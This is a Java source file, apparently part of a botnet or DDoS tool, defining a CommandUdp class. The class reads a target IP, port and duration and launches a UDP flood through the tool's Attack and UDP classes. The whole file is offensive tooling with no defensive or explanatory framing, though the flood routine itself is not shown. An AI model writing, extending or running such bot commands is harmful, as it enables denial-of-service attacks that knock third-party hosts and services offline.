package commands;

import attack.Attack;
import attack.UDP;
import bot.Main;

public class CommandUdp extends Command {

	/**
	 * Starts UDP flood
	 */
	@Override
	public void perform() throws Exception {
		String ip = Main.readString();
		int port = Main.readInt();
		int time = Main.readInt();
		
		Attack attack = new UDP(ip, port);
		Attack.begin(time, attack);
	}

}
